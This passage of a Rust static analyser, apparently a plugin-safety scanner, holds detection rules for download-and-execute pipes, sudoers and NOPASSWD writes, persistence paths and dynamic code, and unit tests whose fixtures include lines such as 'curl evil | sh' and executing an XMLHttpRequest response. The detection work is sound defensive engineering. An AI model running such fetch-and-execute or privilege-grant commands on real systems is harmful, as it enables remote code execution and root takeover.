        let line = strip_line_comment(raw_line, comment_style);
        if line.is_empty() {
            continue;
        }

        // Download-and-execute: fetcher feeding an interpreter through a
        // pipe, or Python fetching straight into exec/system.
        let downloads = find_word(line, "curl").is_some() || find_word(line, "wget").is_some();
        let pipes_to_interpreter = line.split('|').skip(1).any(|segment| {
            let trimmed = segment.trim();
            let head = trimmed.split_whitespace().next().unwrap_or("");
            let basename = head.rsplit('/').next().unwrap_or(head);
            matches!(
                basename,
                "sh" | "bash" | "dash" | "zsh" | "ksh" | "ash" | "python" | "python3"
            )
        });
        let python_fetch_to_exec = matches!(kind, PayloadKind::Python)
            && (line.contains("urlopen")
                || line.contains("requests.get")
                || line.contains("urllib"))
            && (line.contains("os.system")
                || line.contains("subprocess")
                || line.contains("exec(")
                || line.contains("eval("));
        if (downloads && pipes_to_interpreter) || python_fetch_to_exec {
            outcome.result_parts.push(parts(
                download_rule,
                number,
                "download-execute",
                Confidence::LexicalFallback,
            ));
        }

        // Privilege escalation: an actual passwordless grant or a sudoers
        // WRITE. Read-only inspection (`grep NOPASSWD`, `cat`) and bare
        // sudo/pkexec invocation stay capability-level, matching the rule
        // summary's meaning.
        let write_indicator = line.contains(">")
            || line.contains(">>")
            || line.contains("tee ")
            || line.contains("visudo")
            || line.contains("sed -i")
            || line.contains("chattr");
        // Read-only inspection of sudoers policy is not a grant.
        let first_word = line
            .split_whitespace()
            .next()
            .unwrap_or("")
            .rsplit('/')
            .next()
            .unwrap_or("");
        let readonly_inspection = matches!(
            first_word,
            "grep" | "cat" | "less" | "head" | "tail" | "stat" | "journalctl"
        );
        let sudoers_write = line.contains("sudoers") && write_indicator && !readonly_inspection;
        let nopasswd_grant = line.contains("NOPASSWD")
            && (line.contains("sudoers") || write_indicator)
            && !readonly_inspection;
        if nopasswd_grant || sudoers_write {
            outcome.result_parts.push(parts(
                privilege_rule,
                number,
                if nopasswd_grant {
                    "passwordless-root"
                } else {
                    "sudoers-write"
                },
                Confidence::LexicalFallback,
            ));
        }
        if ["sudo ", "pkexec ", "doas "]
            .iter()
            .any(|token| line.contains(token))
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "systemctl").is_some()
            || find_word(line, "systemd-run").is_some()
            || find_word(line, "rc-service").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "pacman").is_some()
            || find_word(line, "paru").is_some()
            || find_word(line, "yay").is_some()
            || find_word(line, "apt-get").is_some()
            || find_word(line, "dnf ").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }
    }

    outcome
}

/// Plugin manifests feed context-level results and capability context that
/// influence review priority without ever asserting malicious behavior.
fn apply_manifest_context(content: &[u8], relative_path: &str, artifacts: &mut AnalysisArtifacts) {
    let value = match serde_json::from_slice::<serde_json::Value>(content) {
        Ok(value) => value,
        Err(_) => {
            artifacts
                .limitations
                .push(format!("manifest-context-unreadable:{relative_path}"));
            return;
        }
    };
    // Both the installed layout (`plugins: [...]`) and single-plugin trees
    // (`kinds` at top level or under one plugin object) are accepted.
    let mut kinds_lists: Vec<serde_json::Value> = Vec::new();
    if let Some(plugins) = value.get("plugins").and_then(serde_json::Value::as_array) {
        for plugin in plugins {
            if let Some(kinds) = plugin.get("kinds") {
                kinds_lists.push(kinds.clone());
            }
        }
    } else if let Some(kinds) = value.get("kinds") {
        kinds_lists.push(kinds.clone());
    }
    let mut seen_bar = false;
    let mut seen_service = false;
    for kinds_value in &kinds_lists {
        let Some(kinds) = kinds_value.as_array() else {
            continue;
        };
        for kind in kinds.iter().filter_map(serde_json::Value::as_str) {
            match kind {
                "bar" => seen_bar = true,
                "service" => seen_service = true,
                _ => {}
            }
        }
    }
    if !seen_bar && !seen_service {
        return;
    }
    if seen_bar
        && let Ok(result) = NormalizedResult::new(
            REPLACES_BAR_RULE,
            relative_path,
            None,
            None,
            "replaces-bar-context",
            None,
        )
    {
        artifacts.results.push(result);
    }
    if seen_service {
        let mut occurrence = occurrence(
            Capability::PersistenceScheduling,
            Language::Context,
            1,
            "headless-service-kind",
        );
        occurrence.relative_path = relative_path.to_owned();
        artifacts.capabilities.push(occurrence);
    }
}

#[cfg(feature = "qml-parser")]
fn analyze_qml_source(source: &str) -> FileOutcome {
    match crate::qml::parse_qml(source.as_bytes()) {
        Some(tree) => ast_scan_qml(source, &tree),
        None => lexical_scan(source, Language::Qml),
    }
}

#[cfg(not(feature = "qml-parser"))]
fn analyze_qml_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::Qml)
}

// ---------------------------------------------------------------------------
// AST-backed QML analysis (qml-parser feature).
// ---------------------------------------------------------------------------

#[cfg(feature = "qml-parser")]
mod ast {
    use super::*;

    /// Classified value of a binding or call argument.
    enum Value {
        Static(String),
        Dynamic(&'static str),
    }

    pub(super) fn scan(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
        let mut outcome = FileOutcome {
            result_parts: Vec::new(),
            capabilities: Vec::new(),
            references: Vec::new(),
            parse_degraded: tree.root_node().has_error(),
            confidence: Confidence::AstBacked,
        };
        let mut flags = LexFlags {
            detached_any: None,
            network: None,
        };

        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let kind = node.kind();
            match kind {
                "ui_import" => {
                    let module = import_module_text(source, node);
                    if !module.is_empty() {
                        apply_import_surface(&module, number_of(node), &mut outcome);
                    }
                }
                "ui_object_definition" => {
                    handle_object_definition(source, node, &mut outcome);
                    // Loader { source: <expr> }: computed sources are
                    // dynamic reference sinks.
                    let mut loader_cursor = node.walk();
                    let children: Vec<tree_sitter::Node> =
                        node.children(&mut loader_cursor).collect();
                    let is_loader = children.iter().any(|child| {
                        child.kind() == "identifier" && node_text(source, *child) == "Loader"
                    });
                    if is_loader && binding_value_named(source, node, "source").is_some() {
                        let binding = binding_value_named(source, node, "source").unwrap();
                        {
                            match classify_value(source, binding) {
                                Value::Static(text) => {
                                    if is_path_shaped(&text) {
                                        outcome.references.push((number_of(binding), text));
                                    }
                                }
                                Value::Dynamic(_) => {
                                    outcome.result_parts.push(parts(
                                        DYNAMIC_REFERENCE_RULE,
                                        number_of(binding),
                                        format!(
                                            "dynamic-reference-sink:Loader.source:{}",
                                            node_text(source, unwrap_expression_statement(binding))
                                                .chars()
                                                .take(120)
                                                .collect::<String>()
                                        ),
                                        Confidence::AstBacked,
                                    ));
                                }
                            }
                        }
                    }
                }
                "call_expression" => {
                    handle_call_expression(source, node, &mut outcome, &mut flags);
                }
                "identifier" | "property_identifier" => {
                    let token_line = ast::number_of(node);
                    apply_surface_token(source, node, &mut outcome, token_line);
                }
                "string" => {
                    let content = string_literal_content(source, node);
                    if let Some(length) = encoded_literal_length(&content) {
                        outcome.result_parts.push(parts(
                            OBFUSCATION_RULE,
                            number_of(node),
                            format!("encoded-literal:{length}"),
                            Confidence::AstBacked,
                        ));
                    }
                }
                "new_expression" => {
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "Function"
                    {
                        // Runtime code construction via the Function
                        // constructor is equivalent to eval for review
                        // purposes.
                        outcome.result_parts.push(parts(
                            DYNAMIC_CODE_RULE,
                            number_of(node),
                            "dynamic-code-construction:new Function",
                            Confidence::AstBacked,
                        ));
                        outcome.capabilities.push(occurrence(
                            Capability::DynamicCodeExecution,
                            Language::Qml,
                            number_of(node),
                            "new Function",
                        ));
                    }
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "XMLHttpRequest"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new XMLHttpRequest",
                        ));
                    } else if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "WebSocket"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new WebSocket",
                        ));
                    }
                }
                _ => {}
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }

        // Literal references: path-shaped strings in reference positions.
        collect_ast_references(source, tree, &mut outcome.references);

        outcome
    }

    pub(super) fn number_of(node: tree_sitter::Node) -> u32 {
        node.start_position().row as u32 + 1
    }

    fn node_text<'a>(source: &'a str, node: tree_sitter::Node) -> &'a str {
        &source[node.start_byte()..node.end_byte()]
    }

    fn handle_object_definition(source: &str, node: tree_sitter::Node, outcome: &mut FileOutcome) {
        let mut cursor = node.walk();
        let children: Vec<tree_sitter::Node> = node.children(&mut cursor).collect();
        let Some(type_node) = children.iter().find(|child| child.kind() == "identifier") else {
            return;
        };
        let type_name = node_text(source, *type_node);

        match type_name {
            "Process" => {
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    Language::Qml,
                    number_of(*type_node),
                    type_name,
                ));
                if let Some(binding_value) = binding_value(source, node, "command") {
                    evaluate_execution_value(source, binding_value, SinkKind::Process, outcome);
                }
            }
            "FileView" => {
                outcome.capabilities.push(occurrence(
                    Capability::FilesystemAccess,
                    Language::Qml,
                    number_of(*type_node),
                    type_name,
                ));
                if let Some(path_value) = binding_value(source, node, "path") {
                    let unwrapped = unwrap_expression_statement(path_value);
                    match classify_value(source, path_value) {
                        Value::Static(text) => {
                            // Persistence locations: writing toward autostart
                            // or user-systemd units is a context finding.
                            if text.contains("autostart")
                                || text.contains("systemd/user")
                                || text.contains(".config/systemd")
                            {
                                outcome.result_parts.push(parts(
                                    PERSISTENCE_RULE,
                                    number_of(unwrapped),
                                    format!("persistence-location:{text}"),
                                    Confidence::AstBacked,
                                ));
                            }
                        }
                        Value::Dynamic(_) => {
                            // Computed reference sink: explicit low-confidence
                            // finding per the S3 exit criterion.
                            outcome.result_parts.push(parts(
                                DYNAMIC_REFERENCE_RULE,
                                number_of(unwrapped),
                                format!(
                                    "dynamic-reference-sink:FileView.path:{}",
                                    node_text(source, unwrapped)
                                        .chars()
                                        .take(120)
                                        .collect::<String>()
                                ),
                                Confidence::AstBacked,
                            ));
                        }
                    }
                }
            }
            "Timer" => {
                outcome.capabilities.push(occurrence(
                    Capability::PersistenceScheduling,
                    Language::Qml,
                    number_of(*type_node),
                    type_name,
                ));
            }
            _ => {}
        }
    }

    /// The value expression of `property: value` inside one object
    /// definition. Bindings sit one level down, in the initializer.
    fn binding_value<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        binding_value_named(source, object, property)
    }

    fn binding_value_named<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        let mut outer = object.walk();
        let initializer = object
            .children(&mut outer)
            .find(|child| child.kind() == "ui_object_initializer")?;
        let mut cursor = initializer.walk();
        for child in initializer.children(&mut cursor) {
            if child.kind() != "ui_binding" {
                continue;
            }
            let mut binding_cursor = child.walk();
            let parts: Vec<tree_sitter::Node> = child.children(&mut binding_cursor).collect();
            let Some(name_node) = parts.first() else {
                continue;
            };
            if node_text(source, *name_node) != property {
                continue;
            }
            // Skip the ':' and take the expression after it.
            return parts.iter().rev().find(|part| part.kind() != ":").copied();
        }
        None
    }

    fn classify_value(source: &str, node: tree_sitter::Node) -> Value {
        let inner = unwrap_expression_statement(node);
        match inner.kind() {
            "string" => Value::Static(string_literal_content(source, inner)),
            "template_string" => {
                let mut cursor = inner.walk();
                let has_substitution = inner
                    .children(&mut cursor)
                    .any(|child| child.kind() == "template_substitution");
                if has_substitution {
                    Value::Dynamic("dynamic-command")
                } else {
                    Value::Static(template_plain_content(source, inner))
                }
            }
            "array" => {
                let mut elements = Vec::new();
                let mut cursor = inner.walk();
                for child in inner.children(&mut cursor) {
                    if matches!(child.kind(), "[" | "]" | "," | ";" | "\"" | "'") {
                        continue;
                    }
                    match classify_value(source, child) {
                        Value::Static(text) => elements.push(text),
                        Value::Dynamic(reason) => return Value::Dynamic(reason),
                    }
                }
                Value::Static(elements.join(" "))
            }
            _ => {
                // Provenance marker: does this expression read network
                // response data? Checked over the raw slice so any nesting
                // depth counts.
                let text = node_text(source, inner);
                if text.contains("responseText")
                    || text.contains(".response")
                    || text.contains(".text(")
                {
                    Value::Dynamic("network-response-executed")
                } else {
                    Value::Dynamic("dynamic-command")
                }
            }
        }
    }

    fn unwrap_expression_statement<'a>(node: tree_sitter::Node<'a>) -> tree_sitter::Node<'a> {
        let mut current = node;
        loop {
            let mut cursor = current.walk();
            let named: Vec<tree_sitter::Node> = current
                .children(&mut cursor)
                .filter(|child| child.is_named())
                .collect();
            match (current.kind(), named.as_slice()) {
                ("expression_statement" | "parenthesized_expression", [single]) => {
                    current = *single
                }
                _ => return current,
            }
        }
    }

    fn string_literal_content(source: &str, string_node: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = string_node.walk();
        for child in string_node.children(&mut cursor) {
            if child.kind() == "string_fragment" {
                content.push_str(node_text(source, child));
            }
        }
        content
    }

    fn template_plain_content(source: &str, template: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = template.walk();
        for child in template.children(&mut cursor) {
            if child.kind() == "string_fragment" {
                content.push_str(node_text(source, child));
            }
        }
        content
    }

    fn handle_call_expression(
        source: &str,
        node: tree_sitter::Node,
        outcome: &mut FileOutcome,
        flags: &mut LexFlags,
    ) {
        let mut cursor = node.walk();
        let children: Vec<tree_sitter::Node> = node.children(&mut cursor).collect();
        let Some(callee) = children.first().copied() else {
            return;
        };
        let callee_name = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last).to_owned())
                    .unwrap_or_default()
            }
            "identifier" => node_text(source, callee).to_owned(),
            _ => String::new(),
        };
        if matches!(callee_name.as_str(), "eval" | "createQmlObject" | "atob") {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number_of(node),
                format!("dynamic-code-construction:{callee_name}"),
                Confidence::AstBacked,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                Language::Qml,
                number_of(node),
                &callee_name,
            ));
        }
        let is_detached = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last) == "execDetached")
                    .unwrap_or(false)
            }
            "identifier" => node_text(source, callee) == "execDetached",
            _ => false,
        };
        if !is_detached {
            // fetch(...) / X.fetch(...): network capability.
            let fetch_call = match callee.kind() {
                "identifier" => node_text(source, callee) == "fetch",
                "member_expression" => {
                    let mut member_cursor = callee.walk();
                    callee
                        .children(&mut member_cursor)
                        .last()
                        .map(|last| node_text(source, last) == "fetch")
                        .unwrap_or(false)
                }
                _ => false,
            };
            if fetch_call {
                flags.network.get_or_insert(number_of(node));
                outcome.capabilities.push(occurrence(
                    Capability::NetworkAccess,
                    Language::Qml,
                    number_of(node),
                    "fetch()",
                ));
            }
            return;
        }
        flags.detached_any.get_or_insert(number_of(node));
        outcome.capabilities.push(occurrence(
            Capability::DetachedProcessExecution,
            Language::Qml,
            number_of(node),
            node_text(source, node)
                .chars()
                .take(200)
                .collect::<String>()
                .as_str(),
        ));
        // First argument after the callee's arguments '(' — reuse classification.
        if let Some(arguments) = children.iter().find(|child| child.kind() == "arguments") {
            let mut args_cursor = arguments.walk();
            let args: Vec<tree_sitter::Node> = arguments
                .children(&mut args_cursor)
                .filter(|child| child.is_named())
                .collect();
            if let Some(first) = args.first().copied() {
                evaluate_execution_value(source, first, SinkKind::DetachedExecution, outcome);
            }
        }
    }

    fn evaluate_execution_value(
        source: &str,
        value_node: tree_sitter::Node,
        kind: SinkKind,
        outcome: &mut FileOutcome,
    ) {
        let number = number_of(value_node);
        let rule_id = match kind {
            SinkKind::Process => PROCESS_RULE,
            SinkKind::DetachedExecution => DETACHED_RULE,
        };
        match classify_value(source, value_node) {
            Value::Static(text) => {
                if let Some(shell_offset) = find_shell_interpreter(&text) {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        format!(
                            "shell-interpreter-command:{}",
                            text.chars()
                                .skip(shell_offset)
                                .take(400)
                                .collect::<String>()
                        ),
                        Confidence::AstBacked,
                    ));
                }
            }
            Value::Dynamic(reason) => {
                let _ = kind;
                // A dynamic argument is only a finding when its visible
                // provenance is network response data; otherwise it stays a
                // capability observation (rule contract).
                if reason == "network-response-executed" {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        reason,
                        Confidence::AstBacked,
                    ));
                }
            }
        }
    }

    fn collect_ast_references(
        source: &str,
        tree: &tree_sitter::Tree,
        references: &mut Vec<(u32, String)>,
    ) {
        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let text = match node.kind() {
                "string" => string_literal_content(source, node),
                "template_string" => template_plain_content(source, node),
                _ => String::new(),
            };
            if is_path_shaped(&text) {
                references.push((number_of(node), text));
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }
    }
}

#[cfg(feature = "qml-parser")]
fn ast_scan_qml(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
    ast::scan(source, tree)
}

#[cfg(test)]
mod tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    #[expect(dead_code, reason = "used by the fallback-build test only")]
    fn one_file_inventory(relative: &str, kind: PayloadKind, size: usize) -> PayloadInventory {
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: relative.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        inventory
    }

    pub(crate) fn analyze_with(
        mut inventory: PayloadInventory,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::HashMap<&str, &[u8]> = contents
            .iter()
            .map(|(path, bytes)| (*path, *bytes))
            .collect();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| {
                lookup
                    .get(entry.relative_path.as_str())
                    .map(|bytes| bytes.to_vec())
            },
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    #[test]
    fn static_benign_process_is_capability_only() {
        let source = r#"
import Quickshell.Io
Process { command: ["notify-send", "hello"] }
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Main.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.results.is_empty(),
            "benign argv must not be a finding"
        );
        assert_eq!(
            inventory.entries[0].coverage_state,
            CoverageState::Analyzed,
            "capability observation counts as analysis output"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn shell_chain_argv_is_a_finding() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Evil.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1);
        assert_eq!(rendered[0].rule_id, PROCESS_RULE);
        assert_eq!(rendered[0].severity, "medium");
        assert!(
            rendered[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only() {
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        // A bare identifier has no visible suspicious provenance; the ability
        // is recorded, never a finding (rule contract).
        assert!(artifacts.rendered_findings().is_empty());
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn quoted_slashes_survive_but_comments_do_not() {
        // A quoted URL before a live command must not hide it, and a
        // commented-out call must never become a finding.
        let js_source = r#"var url = "https://example.test/a";
execDetached("echo ok"); // execDetached("sh -c curl evil | sh")
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comments.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(js_source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented chains are invisible; quoted URLs are inert: {:?}",
            artifacts.rendered_findings()
        );

        // Same line: a quoted URL must not hide a LIVE command binding that
        // follows it, even with a trailing comment after it.
        let js_same_line = "var u = \"https://example.test/a\"; Process { command: [\"sh\", \"-c\", \"curl evil | sh\"] } // tail\n";
        let mut same_line_inventory = PayloadInventory::default();
        same_line_inventory.entries.push(PayloadEntry {
            relative_path: "SameLine.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_same_line.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let same_line_artifacts = analyze_inventory(
            &mut same_line_inventory,
            &|_| Some(js_same_line.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let same_line_findings = same_line_artifacts.rendered_findings();
        assert_eq!(same_line_findings.len(), 1, "{same_line_findings:?}");
        assert!(
            same_line_findings[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );

        // Same shape as above, but the second call is LIVE: the finding
        // survives the earlier quoted URL and the trailing comment.
        let js_live = r#"var url = "https://example.test/a";
Process { command: "notify" }; execDetached(xhr.responseText) // note
"#;
        let mut live_inventory = PayloadInventory::default();
        live_inventory.entries.push(PayloadEntry {
            relative_path: "Live.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_live.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let live_artifacts = analyze_inventory(
            &mut live_inventory,
            &|_| Some(js_live.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = live_artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn later_suspicious_execdetached_on_one_line_is_not_masked() {
        // A benign first call must not suppress the suspicious second one,
        // even when they share a line inside a real handler body.
        let source = r#"Item {
    Component.onCompleted: {
        Quickshell.execDetached("echo ok"); Quickshell.execDetached(xhr.responseText)
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Mask.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].rule_id, DETACHED_RULE);
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn comments_never_feed_lexical_provenance() {
        let source = "Process { command: \"notify-send hi\" } // sh -c curl evil | sh\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comment.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented-out chains are not provenance: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only_lexical_parity() {
        // Lexical builds additionally cannot even see the flow; both must
        // agree that a bare identifier is never a finding.
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        assert!(artifacts.rendered_findings().is_empty());
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn network_response_reaching_execution_is_a_finding() {
        let source = r#"Item {
    Component.onCompleted: {
        var xhr = new XMLHttpRequest()
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Chain.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DETACHED_RULE);
        assert_eq!(rendered[0].evidence, "network-response-executed");
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn unrelated_network_and_execution_never_form_a_finding() {
        let source = r#"Item {
    Timer { onTriggered: statusText.text = "tick" }
    Process { command: ["notify-send", "done"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/api")
        xhr.send()
    } }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Calm2.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "co-occurrence without data flow must stay capability-only: {:?}",
            artifacts.rendered_findings()
        );
        let kinds: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(kinds.contains(&"network-access"));
        assert!(kinds.contains(&"process-execution"));
        // Capability records carry their covering-rule contract.
        for capability in &artifacts.capabilities {
            assert!(capability.source_rule_id.is_some(), "{capability:?}");
            assert!(!capability.explanation.is_empty());
            assert!(!capability.review_guidance.is_empty());
        }
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn computed_loader_source_is_an_explicit_low_confidence_finding() {
        let source = r#"Item {
    Loader { source: root.dynamicPath }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "DynRef.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DYNAMIC_REFERENCE_RULE);
        assert_eq!(rendered[0].severity, "low");
        assert_eq!(rendered[0].confidence.as_deref(), Some("ast-backed"));
        assert!(
            rendered[0]
                .evidence
                .starts_with("dynamic-reference-sink:Loader.source")
        );
    }
}

#[cfg(test)]
mod integration_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::Report;
